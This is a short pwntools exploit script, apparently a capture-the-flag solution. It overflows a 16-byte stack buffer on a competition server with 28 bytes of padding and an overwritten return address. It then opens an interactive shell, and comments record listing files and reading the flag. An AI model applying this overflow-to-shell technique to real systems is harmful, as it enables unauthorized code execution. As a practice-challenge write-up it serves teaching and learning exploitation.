from pwn import *
#-00000018 buf             db 16 dup(?)
#-00000008                 db ? ; undefined
#-00000007                 db ? ; undefined -> offset
#-00000006                 db ? ; undefined
#-00000005                 db ? ; undefined
#-00000004 var_4           dd ?
#+00000000  s              db 4 dup(?)
#+00000004  r              db 4 dup(?)
#+00000008
#+00000008 ; end of stack variables
conn = remote("cyberyoddha.baycyber.net",10002)
conn.sendline("a"*(28)+'\x72\x91\x04\x08')
conn.interactive()
# ls
#cat flag.txt
#CYCTF{0v3rfl0w!ng_v@ri@bl3$_i$_3z}